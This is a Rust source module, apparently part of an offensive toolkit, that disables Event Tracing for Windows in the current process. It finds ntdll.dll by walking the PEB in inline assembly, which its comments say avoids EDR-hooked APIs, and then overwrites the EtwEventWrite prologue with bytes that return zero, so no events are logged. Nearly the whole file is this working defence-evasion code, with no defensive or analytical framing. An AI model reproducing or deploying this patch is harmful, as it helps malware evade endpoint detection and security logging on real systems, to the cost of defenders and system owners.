//! ETW (Event Tracing for Windows) patching module.
//!
//! Resolves ntdll.dll base address via PEB traversal (inline assembly)
//! and patches EtwEventWrite to return 0 (xor rax, rax; ret), effectively
//! blinding ETW-based telemetry for the current process.

use std::ffi::CString;
use std::mem;
use std::ptr::null_mut;

use winapi::ctypes::c_void;
use winapi::um::libloaderapi::GetProcAddress;
use winapi::um::memoryapi::WriteProcessMemory;
use ntapi::ntpsapi::NtCurrentProcess;

/// Resolves the base address of ntdll.dll by walking the PEB loader data
/// structures via inline assembly. This avoids calling GetModuleHandle
/// which can be hooked by EDR solutions.
#[inline(never)]
unsafe fn resolve_ntdll_base() -> usize {
    let mut base: usize = 0;
    std::arch::asm!(
        r#"
        xor rax, rax
        mov rax, gs:[0x60]          // PEB
        mov rax, [rax + 0x18]       // PEB->Ldr
        mov rax, [rax + 0x20]       // InMemoryOrderModuleList
        mov rax, [rax]              // Skip first entry
        mov rax, [rax + 0x20]       // ntdll.dll base address
        "#,
        lateout("rax") base,
        options(nostack)
    );
    base
}

/// Patches EtwEventWrite in ntdll.dll to neutralize event tracing.
///
/// Writes `xor rax, rax; ret` (48 33 C0 C3) to the function prologue,
/// causing all ETW write calls to return 0 without logging any events.
pub fn patch_etw() {
    unsafe {
        let ntdll_base = resolve_ntdll_base();
        if ntdll_base == 0 {
            return;
        }

        let ntdll_handle = mem::transmute::<usize, *mut c_void>(ntdll_base) as _;

        let func_name = CString::new("EtwEventWrite").unwrap();
        let func_addr = GetProcAddress(ntdll_handle, func_name.as_ptr());
        if func_addr.is_null() {
            return;
        }

        // xor rax, rax; ret — returns 0 (STATUS_SUCCESS)
        let patch = b"\x48\x33\xc0\xc3";
        WriteProcessMemory(
            NtCurrentProcess,
            func_addr as *mut c_void,
            patch.as_ptr() as _,
            patch.len(),
            null_mut(),
        );
    }
}
